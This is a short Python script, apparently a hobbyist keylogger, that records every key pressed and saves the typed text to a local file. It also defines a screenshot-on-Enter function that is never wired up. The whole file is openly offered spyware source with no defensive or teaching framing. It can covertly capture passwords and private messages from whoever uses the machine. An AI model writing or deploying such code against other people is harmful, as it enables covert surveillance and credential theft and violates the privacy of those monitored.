import keyboard
from PIL import ImageGrab
import datetime


def keylogger():
    text = ''
    while True:
        event = keyboard.read_event()
        if event.event_type == "down":
            text += event.name
            print(text)
            time_session = datetime.datetime.now()
            with open(f"message", "w") as file:
                file.write(text)


def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    print("Скриншот сохранен")


def on_key(event):
    if event.name == "enter":
        take_screenshot()


if __name__ == '__main__':
    keylogger()
